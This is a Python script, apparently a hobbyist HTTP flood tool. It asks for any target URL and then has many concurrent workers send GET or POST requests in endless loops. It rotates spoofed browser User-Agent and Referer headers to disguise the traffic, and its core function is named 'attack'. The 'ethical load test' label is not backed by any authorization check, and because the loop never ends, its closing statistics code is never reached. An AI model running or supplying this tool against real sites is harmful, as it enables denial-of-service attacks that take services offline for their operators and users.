import aiohttp
import asyncio
import random
import argparse
import time
from termcolor import colored, cprint
from aiohttp import ClientTimeout, TCPConnector
from collections import defaultdict
import ssl

# User-Agent list
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
]

# Request statistics
request_stats = defaultdict(int)

# Semaphore for concurrent requests
sem = asyncio.Semaphore(1000)

# Banner
def display_banner():
    cprint("\n" + "="*50, "cyan")
    cprint("Made by Mohimanul", "green", attrs=["bold"])
    cprint("The Virtual Myst", "yellow", attrs=["bold"])
    cprint("="*50 + "\n", "cyan")

# Rate limit handling
async def apply_rate_limit(response, backoff_multiplier):
    if response.status == 429:
        retry_after = response.headers.get('Retry-After')
        if retry_after:
            wait_time = int(retry_after)
        else:
            wait_time = random.uniform(2, 5) * backoff_multiplier

        print(colored(f"Rate limit hit. Retrying after {wait_time:.2f} seconds...", "yellow"))
        await asyncio.sleep(wait_time)
        return True, backoff_multiplier * 2
    return False, backoff_multiplier

# Attack function
async def attack(session, url, log_file=None, request_type="GET", payload=None):
    global request_stats
    backoff_multiplier = 1

    async with sem:
        while True:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": random.choice(["text/html", "application/json", "*/*"]),
                "Connection": "keep-alive",
                "Referer": random.choice(["https://google.com", "https://bing.com", ""]),
            }

            start_time = time.time()
            try:
                timeout = ClientTimeout(total=10)

                if request_type == "GET":
                    async with session.get(url, headers=headers, timeout=timeout) as response:
                        rate_limit_hit, backoff_multiplier = await apply_rate_limit(response, backoff_multiplier)
                        if rate_limit_hit:
                            continue

                        response_time = time.time() - start_time
                        request_stats['total_requests'] += 1
                        request_stats['successful_requests'] += 1
                        request_stats['total_response_time'] += response_time
                        print(colored(f"[+] Sent: {response.status} | Time: {response_time:.2f}s", "green"))

                elif request_type == "POST":
                    async with session.post(url, headers=headers, data=payload, timeout=timeout) as response:
                        rate_limit_hit, backoff_multiplier = await apply_rate_limit(response, backoff_multiplier)
                        if rate_limit_hit:
                            continue

                        response_time = time.time() - start_time
                        request_stats['total_requests'] += 1
                        request_stats['successful_requests'] += 1
                        request_stats['total_response_time'] += response_time
                        print(colored(f"[+] POST Sent: {response.status} | Time: {response_time:.2f}s", "green"))

            except Exception as e:
                response_time = time.time() - start_time
                request_stats['total_requests'] += 1
                request_stats['failed_requests'] += 1
                print(colored(f"[-] Error: {e} | Time: {response_time:.2f}s", "red"))

            await asyncio.sleep(random.uniform(0.1, 0.5))

# Main async task runner
async def main(url, workers, log_file, request_type, payload):
    ssl_context = ssl.create_default_context()
    ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')

    connector = TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [attack(session, url, log_file, request_type, payload) for _ in range(workers)]
        await asyncio.gather(*tasks)

# Entry
if __name__ == "__main__":
    display_banner()

    url = input("Enter the target URL (e.g., http://localhost): ")
    if not url.startswith("http"):
        url = "http://" + url
    port = input("Enter the port (default is 80): ") or "80"
    workers = input("Enter the number of concurrent workers (default is 100): ") or "100"
    request_type = input("Enter the request type (GET/POST, default is GET): ").upper() or "GET"
    log_file = input("Enter the log file name (optional, press Enter to skip): ")
    payload = None

    if request_type == "POST":
        payload = input("Enter the POST payload (key=value, separate multiple with '&'): ")

    full_url = f"{url}:{port}"
    workers = int(workers)
    log_file = log_file.strip() if log_file else None

    print(colored("Starting advanced ethical load test with rate limiting and exponential backoff...", "cyan"))
    asyncio.run(main(full_url, workers, log_file, request_type, payload))

    # Final stats
    print(colored(f"\nTest completed. Total Requests: {request_stats['total_requests']}", "cyan"))
    print(colored(f"Successful Requests: {request_stats['successful_requests']}", "green"))
    print(colored(f"Failed Requests: {request_stats['failed_requests']}", "red"))
    if request_stats['total_requests'] > 0:
        avg_response_time = request_stats['total_response_time'] / request_stats['total_requests']
        print(colored(f"Average Response Time: {avg_response_time:.2f}s", "yellow"))
